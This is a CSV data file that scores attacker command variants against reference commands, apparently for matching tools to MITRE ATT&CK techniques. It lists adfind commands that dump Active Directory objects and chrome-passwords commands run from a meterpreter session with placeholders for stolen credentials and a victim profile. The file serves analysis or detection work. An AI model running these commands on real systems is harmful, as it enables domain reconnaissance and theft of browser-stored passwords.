file,tool,input_command,matched_command,edit_score,match_found
command_adfind_TA0007_T1016.txt,adfind,adfind -sc sitedmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.485,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc sitelinkdmp:<site_name>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.463,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc subnetdmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.471,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc gpodmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.431,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc fspdmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.462,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc oudmp,"adfind -f ""(objectcategory=group)""`",0.471,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc dcdmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.438,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc fo:<object_name>,"adfind -f ""(objectcategory=group)""`",0.548,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc kids:<dn>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.412,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc u:<user_name>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.417,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc userinfo:<user_name>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.43,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc g:<group_name>,"adfind -f ""(objectcategory=group)""`",0.5,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc c:<computer_name>,`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,0.477,True
command_adfind_TA0007_T1016.txt,adfind,adfind -daclpipe+ <object_dn>,"adfind -f ""(objectcategory=group)""`",0.469,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sddlpsflag <object_dn>,"adfind -f ""(objectcategory=group)""`",0.492,True
command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.321,True
command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password> -f <victim_chrome_profile_path>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.25,True
command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password> -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.313,True
